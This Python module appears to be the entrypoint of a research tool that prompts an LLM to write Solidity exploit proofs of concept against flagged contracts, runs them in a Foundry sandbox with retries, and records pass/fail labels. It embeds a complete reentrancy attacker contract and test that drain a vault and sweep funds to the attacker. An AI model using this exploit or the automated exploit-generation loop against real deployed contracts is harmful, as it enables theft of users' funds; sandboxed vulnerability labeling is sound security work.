"""Module D step two: the LLM exploit agent entrypoint.

Wraps an LLM around the step one drain-and-assert mechanism. For a flagged
victim contract it asks the LLM to write a proof of concept exploit, runs it in
the Foundry sandbox, and on failure feeds the captured revert or compiler error
back for another attempt, up to a retry cap. The final pass/fail is written as
an execution grounded label to data/labels.csv.

Run:
    python -m agent.run_agent --victim exploits/src/VulnerableVault.sol --vuln reentrancy

Offline self test (no API key, proves the sandbox + labeling path end to end
against real forge execution using a built in reference exploit):
    python -m agent.run_agent --victim exploits/src/VulnerableVault.sol --vuln reentrancy --self-test

The label is ALWAYS grounded in a real forge test run. The only thing --self-test
changes is where the candidate exploit comes from (a built in reference instead
of the LLM), so the plumbing can be validated without network access.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import sys
import urllib.error
import urllib.request
from pathlib import Path
from typing import Dict, Optional, Tuple

from agent import prompts
from agent.labels import Label, append_label
from agent.sandbox import Sandbox, SandboxResult, select_victim_solc

# Default Anthropic model. Chosen by checking the current model list rather than
# from memory (see agent/README.md): claude-opus-5 is the current default Claude
# model. Overridable with --model.
DEFAULT_MODEL = "claude-opus-5"
DEFAULT_RETRIES = 3

# Local backend defaults (Ollama). The exploit agent runs against a free local
# model when no paid API is available. qwen2.5-coder is a capable free code model
# for this task; the exact tag is overridable with --model or the OLLAMA_MODEL
# env var. The host is overridable with OLLAMA_HOST.
DEFAULT_OLLAMA_MODEL = "qwen2.5-coder:7b"
DEFAULT_OLLAMA_HOST = "http://localhost:11434"

# Per call timeout for the local model. Generous enough for a 7B to write two
# Solidity files, but capped so one stuck generation fails that attempt instead
# of hanging the whole run. Overridable with OLLAMA_TIMEOUT (seconds).
OLLAMA_TIMEOUT = int(os.environ.get("OLLAMA_TIMEOUT", "600") or "600")

# Hard cap on generated tokens per call. Enough for two Solidity files with room
# to spare, and it keeps the small local model from generating until it fills
# the context window. Overridable with OLLAMA_NUM_PREDICT.
OLLAMA_NUM_PREDICT = int(os.environ.get("OLLAMA_NUM_PREDICT", "4096") or "4096")

# Context window for the local model. Large enough for the victim source plus the
# prompt scaffolding; on a CPU backend a smaller window decodes faster, so this
# is overridable with OLLAMA_NUM_CTX to fit the machine and the victim size.
OLLAMA_NUM_CTX = int(os.environ.get("OLLAMA_NUM_CTX", "16384") or "16384")

# How long Ollama keeps the model resident between calls. The retry loop and a
# batch make several calls seconds to minutes apart; without this the model
# unloads after Ollama's short default and every call pays a cold reload (tens of
# seconds), which dominates the run and can trip the per call timeout. Keeping it
# warm makes each subsequent call just the (fast) decode. Overridable with
# OLLAMA_KEEP_ALIVE (any duration Ollama accepts, e.g. "30m").
OLLAMA_KEEP_ALIVE = os.environ.get("OLLAMA_KEEP_ALIVE", "").strip() or "30m"

# Backend selection. The CLI --backend flag wins; then the AGENT_BACKEND env var;
# then this default. ollama is the default so the agent runs with no paid API.
DEFAULT_BACKEND = "ollama"
BACKENDS = ("anthropic", "ollama")


# ---------------------------------------------------------------------------
# Repo layout
# ---------------------------------------------------------------------------

def repo_root() -> Path:
    """The project root, two levels up from this file (agent/run_agent.py)."""
    return Path(__file__).resolve().parent.parent


def resolve_forge() -> str:
    """Locate the forge binary.

    Prefers whatever is on PATH, then falls back to the standard foundryup
    install location, so the agent runs whether or not the shell has sourced
    the foundry env.
    """
    found = shutil.which("forge")
    if found:
        return found
    home = Path.home() / ".foundry" / "bin"
    for name in ("forge.exe", "forge"):
        candidate = home / name
        if candidate.exists():
            return str(candidate)
    # Let subprocess raise a clear error later if it truly is not installed.
    return "forge"


# ---------------------------------------------------------------------------
# Victim inspection
# ---------------------------------------------------------------------------

def inspect_victim(victim_path: Path) -> Tuple[str, str, str, str, bool]:
    """Return (source_text, primary_contract_name, exploit_pragma, victim_solc,
    cross_version) for the victim.

    The primary contract name is the last top level `contract X` declaration,
    which for these single-purpose victims is the one under test.

    victim_solc is the concrete compiler the victim will be compiled at, chosen
    from its pragma by the same Module A logic the sandbox uses (older, open
    ended pragmas are capped so a 0.5.x contract is not handed a 0.8.x compiler).

    cross_version is True when the victim is not a 0.8.x contract. In that case
    the generated attacker and test are written in 0.8.x (exploit_pragma 0.8.28)
    and reach the victim through vm.deployCode instead of importing it, because a
    0.8.x file cannot import a lower version source and forge-std needs >=0.8.13.
    When the victim is already 0.8.x, the generated files share its exact version
    and import it directly (the original step one flow).
    """
    source = victim_path.read_text(encoding="utf-8", errors="replace")

    names = re.findall(r"^\s*contract\s+(\w+)", source, re.MULTILINE)
    contract_name = names[-1] if names else victim_path.stem

    victim_solc, _reason = select_victim_solc(source)
    cross_version = not victim_solc.startswith("0.8.")
    exploit_pragma = "0.8.28" if cross_version else victim_solc

    return source, contract_name, exploit_pragma, victim_solc, cross_version


# ---------------------------------------------------------------------------
# LLM response parsing
# ---------------------------------------------------------------------------

def parse_exploit_files(response_text: str) -> Dict[str, str]:
    """Extract the generated files from the LLM response.

    Splits on the BEGIN_FILE: <path> ... END_FILE markers defined in prompts.py.
    A fenced code block wrapper (```solidity ... ```) around the content, which
    models often add out of habit, is stripped. Returns {relative_path: source}.
    """
    files: Dict[str, str] = {}
    pattern = re.compile(
        rf"{re.escape(prompts.FILE_BEGIN)}\s*(?P<path>\S+)\s*\n"
        rf"(?P<body>.*?)"
        rf"\n\s*{re.escape(prompts.FILE_END)}",
        re.DOTALL,
    )
    for m in pattern.finditer(response_text):
        path = m.group("path").strip()
        body = _strip_code_fence(m.group("body"))
        files[path] = body
    return files


def _strip_code_fence(text: str) -> str:
    """Remove a leading ```lang line and trailing ``` if the model added them."""
    text = text.strip("\n")
    lines = text.split("\n")
    if lines and lines[0].lstrip().startswith("```"):
        lines = lines[1:]
    if lines and lines[-1].strip().startswith("```"):
        lines = lines[:-1]
    return "\n".join(lines).strip() + "\n"


# ---------------------------------------------------------------------------
# LLM client
# ---------------------------------------------------------------------------

def require_api_key() -> str:
    """Read ANTHROPIC_API_KEY, failing loudly with guidance if it is missing."""
    key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
    if not key:
        raise SystemExit(
            "ERROR: ANTHROPIC_API_KEY is not set.\n"
            "The exploit agent needs Anthropic API access to generate exploits.\n"
            "Set it and retry, for example (PowerShell):\n"
            '    $env:ANTHROPIC_API_KEY = "sk-ant-..."\n'
            "or run with --self-test to validate the sandbox and labeling path "
            "offline using the built in reference exploit."
        )
    return key


def call_llm(model: str, system_prompt: str, user_prompt: str) -> str:
    """One LLM call. Returns the concatenated text content of the response.

    The anthropic SDK interface is used as verified at runtime against the
    installed package (see agent/README.md): anthropic.Anthropic() reads the key
    from the environment, and messages.create returns content as a list of typed
    blocks, of which we keep the text blocks.
    """
    import anthropic  # imported lazily so --self-test needs no network stack

    client = anthropic.Anthropic()
    try:
        response = client.messages.create(
            model=model,
            max_tokens=16000,
            system=system_prompt,
            # Adaptive thinking: recommended default for a task this involved.
            thinking={"type": "adaptive"},
            messages=[{"role": "user", "content": user_prompt}],
        )
    except anthropic.AuthenticationError as exc:
        raise SystemExit(f"ERROR: Anthropic authentication failed: {exc}")
    except anthropic.APIStatusError as exc:
        raise SystemExit(f"ERROR: Anthropic API error ({exc.status_code}): {exc}")
    except anthropic.APIConnectionError as exc:
        raise SystemExit(f"ERROR: could not reach the Anthropic API: {exc}")

    return "".join(
        block.text for block in response.content if getattr(block, "type", None) == "text"
    )


def ollama_host() -> str:
    """The Ollama base URL, overridable with OLLAMA_HOST."""
    return os.environ.get("OLLAMA_HOST", "").strip() or DEFAULT_OLLAMA_HOST


def call_llm_ollama(model: str, system_prompt: str, user_prompt: str) -> str:
    """One local Ollama chat call. Returns the response text as a plain string,
    the SAME shape call_llm returns, so the retry loop, parser, sandbox, and
    labeling are all unchanged by the backend switch.

    Uses the local chat endpoint at <host>/api/chat with streaming off. The
    request and response field names were verified at runtime against the running
    Ollama version before this was wired (see agent/README.md): the request takes
    a messages list of {role, content} objects, and a non streaming response
    returns the assistant text at message.content, with done true. Parsing is
    kept defensive so a response missing message.content fails as an empty
    candidate (a normal failed attempt) rather than crashing the loop.
    """
    host = ollama_host()
    url = host.rstrip("/") + "/api/chat"
    payload = {
        "model": model,
        "messages": [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt},
        ],
        # Non streaming so the whole answer arrives as one JSON object.
        "stream": False,
        # Keep the model resident between calls so the retry loop and batch do not
        # pay a cold reload every time.
        "keep_alive": OLLAMA_KEEP_ALIVE,
        "options": {
            # Low temperature for more deterministic code output.
            "temperature": 0.2,
            # Raise the context window well above Ollama's small default so the
            # full victim source and prompt scaffolding are not silently cut.
            "num_ctx": OLLAMA_NUM_CTX,
            # Cap the number of generated tokens. Two Solidity files fit well
            # under this; the cap stops the small local model from running away
            # (repeating until it fills the context window), which otherwise
            # stalls a generation until the request times out.
            "num_predict": OLLAMA_NUM_PREDICT,
        },
    }
    data = json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(
        url, data=data, headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        with urllib.request.urlopen(request, timeout=OLLAMA_TIMEOUT) as response:
            body = response.read().decode("utf-8", errors="replace")
    except TimeoutError:
        # A single slow or stuck local generation must not kill the whole run.
        # Treat it as an empty (failed) candidate so the loop records a failed
        # attempt and moves on, rather than crashing and leaving no label.
        print(f"  ollama call timed out after {OLLAMA_TIMEOUT}s; treating as a "
              "failed attempt")
        return ""
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode("utf-8", errors="replace") if exc.fp else ""
        raise SystemExit(
            f"ERROR: Ollama API returned HTTP {exc.code} at {url}: {detail[:400]}\n"
            f"Check that the model '{model}' is pulled (ollama pull {model})."
        )
    except urllib.error.URLError as exc:
        raise SystemExit(
            f"ERROR: could not reach the Ollama API at {url}: {exc.reason}.\n"
            "Start it with `ollama serve` (the Windows app starts it "
            "automatically) and pull the model, then retry. To use the paid "
            "Anthropic backend instead, pass --backend anthropic."
        )

    try:
        doc = json.loads(body)
    except json.JSONDecodeError:
        raise SystemExit(f"ERROR: Ollama returned non JSON output: {body[:400]}")

    message = doc.get("message") if isinstance(doc, dict) else None
    if isinstance(message, dict):
        return message.get("content", "") or ""
    # Some deployments echo an error field instead of a message.
    if isinstance(doc, dict) and doc.get("error"):
        raise SystemExit(f"ERROR: Ollama reported: {doc['error']}")
    return ""


def generate_candidate(backend: str, model: str, system_prompt: str, user_prompt: str) -> str:
    """Dispatch one LLM generation to the selected backend, returning the raw
    response text. Both backends return a plain string, so the caller is
    identical for either one."""
    if backend == "ollama":
        return call_llm_ollama(model, system_prompt, user_prompt)
    return call_llm(model, system_prompt, user_prompt)


# ---------------------------------------------------------------------------
# Built in reference candidate (offline self test only)
# ---------------------------------------------------------------------------
#
# Used only by --self-test. It is a known good reentrancy exploit for
# VulnerableVault, formatted exactly as the LLM is asked to format its answer,
# so it flows through the identical parse -> write -> forge test -> label path.
# This lets the whole mechanism be validated with no API key. It is NOT a mock:
# the label it produces still comes from a real forge test run.

def reference_candidate_response(victim_contract_name: str, victim_basename: str, pragma: str) -> str:
    attacker = f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import {{{victim_contract_name}}} from "./{victim_basename}";

// Reference reentrancy exploit (offline self test candidate).
contract Attacker {{
    {victim_contract_name} public immutable vault;
    address public immutable owner;
    uint256 public stake;

    constructor({victim_contract_name} _vault) {{
        vault = _vault;
        owner = msg.sender;
    }}

    function attack() external payable {{
        require(msg.value > 0, "need a stake");
        stake = msg.value;
        vault.deposit{{value: msg.value}}();
        vault.withdraw();
    }}

    // Re-enter while the vault can still pay a full stake. This is the step
    // that drains the pool: the vault has not yet zeroed our balance.
    receive() external payable {{
        if (address(vault).balance >= stake) {{
            vault.withdraw();
        }}
    }}

    function sweep() external {{
        require(msg.sender == owner, "only owner");
        (bool ok, ) = owner.call{{value: address(this).balance}}("");
        require(ok, "sweep failed");
    }}
}}
"""

    test = f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import {{Test, console2}} from "forge-std/Test.sol";
import {{{victim_contract_name}}} from "../../src/generated/{victim_basename}";
import {{Attacker}} from "../../src/generated/Attacker.sol";

// Reference PoC (offline self test). Asserts the real broken invariant.
contract Exploit is Test {{
    {victim_contract_name} internal vault;
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal carol = makeAddr("carol");
    address internal blackhat = makeAddr("blackhat");

    uint256 internal constant HONEST_DEPOSIT = 10 ether;
    uint256 internal constant ATTACKER_STAKE = 1 ether;

    function setUp() public {{
        vault = new {victim_contract_name}();
        hoax(alice, HONEST_DEPOSIT);
        vault.deposit{{value: HONEST_DEPOSIT}}();
        hoax(bob, HONEST_DEPOSIT);
        vault.deposit{{value: HONEST_DEPOSIT}}();
        hoax(carol, HONEST_DEPOSIT);
        vault.deposit{{value: HONEST_DEPOSIT}}();
    }}

    function test_exploit_drains_vault() public {{
        uint256 honestPool = 3 * HONEST_DEPOSIT;
        uint256 vaultBefore = address(vault).balance;

        vm.prank(blackhat);
        Attacker attacker = new Attacker(vault);
        vm.deal(blackhat, ATTACKER_STAKE);
        vm.prank(blackhat);
        attacker.attack{{value: ATTACKER_STAKE}}();
        vm.prank(blackhat);
        attacker.sweep();

        uint256 vaultAfter = address(vault).balance;
        uint256 profit = blackhat.balance - ATTACKER_STAKE;

        // Evidence log lines the sandbox reads back.
        console2.log("vault_before_wei", vaultBefore);
        console2.log("vault_after_wei", vaultAfter);
        console2.log("attacker_profit_wei", profit);

        // Broken invariant: vault drained and attacker richer by the pool.
        assertApproxEqAbs(vaultAfter, 0, ATTACKER_STAKE, "vault was not drained");
        assertGt(blackhat.balance, ATTACKER_STAKE, "attacker did not profit");
        assertGe(profit, honestPool, "attacker did not capture the honest pool");
    }}
}}
"""

    return (
        f"{prompts.FILE_BEGIN} {prompts.ATTACKER_PATH}\n{attacker}{prompts.FILE_END}\n"
        f"{prompts.FILE_BEGIN} {prompts.TEST_PATH}\n{test}{prompts.FILE_END}\n"
    )


# ---------------------------------------------------------------------------
# The loop
# ---------------------------------------------------------------------------

def run_victim(
    victim_path: Path,
    vuln_class: str,
    retries: int,
    model: str,
    self_test: bool,
    exploits_dir: Path,
    labels_path: Path,
    backend: str = DEFAULT_BACKEND,
) -> Label:
    """Run the generate -> execute -> retry loop for one victim, then label it.

    Control flow:
      - prepare the sandbox (copy victim into src/generated/)
      - for each attempt up to `retries`:
          1. build the prompt, including the previous attempt's error as feedback
          2. get candidate files (from the LLM, or the reference in self test)
          3. write them into the sandbox
          4. run forge test scoped to the generated test
          5. pass  -> stop, this is a confirmed label
             fail  -> keep the error as feedback for the next attempt
      - stop on the first pass or when attempts run out
      - write one execution grounded label row
    """
    source, contract_name, pragma, victim_solc, cross_version = inspect_victim(victim_path)
    profile = prompts.VULN_PROFILES.get(vuln_class, prompts.VULN_PROFILES["reentrancy"])
    invariant = profile["invariant"]

    sandbox = Sandbox(exploits_dir, forge_bin=resolve_forge())
    victim_basename = sandbox.prepare_victim(victim_path)
    deploy_code_target = f"{victim_basename}:{contract_name}"
    if cross_version:
        print(f"  victim solc {victim_solc}: cross-version mode "
              f"(deployCode {deploy_code_target}, exploit in {pragma})")
    else:
        print(f"  victim solc {victim_solc}: import mode (exploit in {pragma})")

    feedback: Optional[str] = None
    attempts = 0
    last_error = "no attempt produced a runnable exploit"
    result: Optional[SandboxResult] = None

    for attempt in range(1, retries + 1):
        attempts = attempt
        print(f"\n--- attempt {attempt}/{retries} for {contract_name} ({vuln_class}) ---")

        # 1 + 2: obtain candidate files.
        if self_test:
            print("  self-test: using the built in reference exploit candidate")
            response_text = reference_candidate_response(contract_name, victim_basename, pragma)
        else:
            user_prompt = prompts.build_user_prompt(
                victim_contract_name=contract_name,
                victim_basename=victim_basename,
                victim_source=source,
                vuln_class=vuln_class,
                pragma=pragma,
                feedback=feedback,
                cross_version=cross_version,
                victim_solc=victim_solc,
                deploy_code_target=deploy_code_target,
            )
            print(f"  asking {model} via {backend} for an exploit"
                  + (" (with feedback from the last failure)" if feedback else ""))
            response_text = generate_candidate(
                backend, model, prompts.SYSTEM_PROMPT, user_prompt
            )

        files = parse_exploit_files(response_text)
        missing = [p for p in (prompts.ATTACKER_PATH, prompts.TEST_PATH) if p not in files]
        if missing:
            # A malformed response is itself a failure we can feed back.
            last_error = (
                "your response did not contain the required files: "
                + ", ".join(missing)
                + ". Emit both files between the exact markers."
            )
            feedback = last_error
            print(f"  parse failed: {last_error}")
            continue

        # 3: write into the isolated sandbox (refuses non generated paths).
        sandbox.refresh_victim(victim_path)
        sandbox.write_generated_files(files, victim_basename)

        # 4: execute.
        print("  running forge test on the generated exploit...")
        result = sandbox.run_generated_test()

        # Hard stop: if forge/svm cannot obtain the victim's solc at all, this is
        # an environment failure, not a failed drain. Report it precisely and do
        # NOT write a misleading label.
        if result.solc_unavailable:
            sandbox.cleanup()
            raise SystemExit(
                f"ERROR: forge/svm could not obtain solc {victim_solc} for "
                f"{contract_name}; this is a hard stop, not a failed drain.\n"
                f"forge reported:\n{result.error_text}"
            )

        # 5: branch on the real execution result.
        if result.passed:
            print(f"  PASS: {result.evidence}")
            # Keep the passing generated files on disk as the artifact. They live
            # in isolated folders and compile, so a plain `forge test` still
            # passes step one alongside them.
            # Mark provenance so a reader of labels.csv can tell an offline
            # self-test row (built in reference candidate) from a live LLM row.
            evidence = result.evidence
            if cross_version:
                evidence = f"(solc {victim_solc}) {evidence}"
            if self_test:
                evidence = f"(self-test reference) {evidence}"
            label = Label(
                contract=contract_name,
                vuln_class=vuln_class,
                confirmed=True,
                attempts=attempts,
                invariant_asserted=invariant,
                evidence=evidence,
            )
            append_label(label, labels_path)
            return label

        last_error = result.error_text
        feedback = last_error
        print(f"  FAIL: {_short(last_error)}")

    # Retries exhausted without a pass. Remove the generated files so the project
    # still builds, then write a not-confirmed label with the final error.
    sandbox.cleanup()
    fail_evidence = _short(last_error, 200)
    if cross_version:
        fail_evidence = f"(solc {victim_solc}) {fail_evidence}"
    label = Label(
        contract=contract_name,
        vuln_class=vuln_class,
        confirmed=False,
        attempts=attempts,
        invariant_asserted=invariant,
        evidence=fail_evidence,
    )
    append_label(label, labels_path)
    return label


def _short(text: str, limit: int = 160) -> str:
    text = " ".join((text or "").split())
    return text if len(text) <= limit else text[:limit] + " ...[truncated]"


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="python -m agent.run_agent",
        description="Module D step two: generate an exploit with an LLM, confirm "
        "it by execution under Foundry, and emit an execution grounded label.",
    )
    parser.add_argument(
        "--victim",
        required=True,
        help="path to the victim Solidity contract (e.g. exploits/src/VulnerableVault.sol)",
    )
    parser.add_argument(
        "--vuln",
        default="reentrancy",
        choices=sorted(prompts.VULN_PROFILES.keys()),
        help="suspected vulnerability class",
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=DEFAULT_RETRIES,
        help="maximum LLM attempts before giving up",
    )
    parser.add_argument(
        "--backend",
        default=None,
        choices=list(BACKENDS),
        help="LLM backend: 'ollama' (free local model, the default) or "
        "'anthropic' (paid API). The AGENT_BACKEND env var is honored when this "
        "flag is not given; the flag wins over the env var.",
    )
    parser.add_argument(
        "--model",
        default=None,
        help="model id. Defaults per backend: "
        f"'{DEFAULT_OLLAMA_MODEL}' for ollama, '{DEFAULT_MODEL}' for anthropic. "
        "For ollama, OLLAMA_MODEL is honored when this flag is not given.",
    )
    parser.add_argument(
        "--self-test",
        action="store_true",
        help="run the loop offline with a built in reference exploit (no API key "
        "needed); the label still comes from a real forge test run",
    )
    parser.add_argument(
        "--labels",
        default=None,
        help="labels CSV path (default: data/labels.csv at the repo root)",
    )
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)

    root = repo_root()
    victim_path = Path(args.victim)
    if not victim_path.is_absolute():
        victim_path = (root / victim_path).resolve()
    if not victim_path.is_file():
        print(f"ERROR: victim not found: {victim_path}", file=sys.stderr)
        return 2

    exploits_dir = root / "exploits"
    if not (exploits_dir / "foundry.toml").is_file():
        print(f"ERROR: Foundry sandbox not found at {exploits_dir}", file=sys.stderr)
        return 2

    labels_path = Path(args.labels).resolve() if args.labels else (root / "data" / "labels.csv")

    # Backend precedence: explicit flag, then AGENT_BACKEND env var, then default.
    backend = args.backend or os.environ.get("AGENT_BACKEND", "").strip() or DEFAULT_BACKEND
    if backend not in BACKENDS:
        print(f"ERROR: unknown backend '{backend}'. Choose one of {', '.join(BACKENDS)}.",
              file=sys.stderr)
        return 2

    # Model precedence: explicit flag, then a per backend default (with the
    # OLLAMA_MODEL env var honored for the local backend).
    if args.model:
        model = args.model
    elif backend == "ollama":
        model = os.environ.get("OLLAMA_MODEL", "").strip() or DEFAULT_OLLAMA_MODEL
    else:
        model = DEFAULT_MODEL

    # Fail loudly on a missing key before doing any work, but only for the paid
    # Anthropic backend. The local ollama backend needs no key. Self test needs
    # neither.
    if not args.self_test and backend == "anthropic":
        require_api_key()

    if args.self_test:
        mode = "self-test (offline reference)"
    else:
        mode = f"live LLM via {backend}: {model}"

    print("=" * 62)
    print("MODULE D STEP TWO: LLM EXPLOIT AGENT")
    print("=" * 62)
    print(f"  victim   : {victim_path}")
    print(f"  vuln     : {args.vuln}")
    print(f"  mode     : {mode}")
    print(f"  retries  : {args.retries}")
    print(f"  labels   : {labels_path}")

    label = run_victim(
        victim_path=victim_path,
        vuln_class=args.vuln,
        retries=args.retries,
        model=model,
        self_test=args.self_test,
        exploits_dir=exploits_dir,
        labels_path=labels_path,
        backend=backend,
    )

    print("\n" + "=" * 62)
    print("RESULT")
    print("=" * 62)
    print(f"  contract           : {label.contract}")
    print(f"  vuln_class         : {label.vuln_class}")
    print(f"  confirmed          : {'true' if label.confirmed else 'false'}")
    print(f"  attempts           : {label.attempts}")
    print(f"  invariant_asserted : {label.invariant_asserted}")
    print(f"  evidence           : {label.evidence}")
    print(f"  label appended to  : {labels_path}")
    print("=" * 62)

    # Exit 0 on a confirmed drain, 1 otherwise, so the loop is scriptable.
    return 0 if label.confirmed else 1


if __name__ == "__main__":
    raise SystemExit(main())
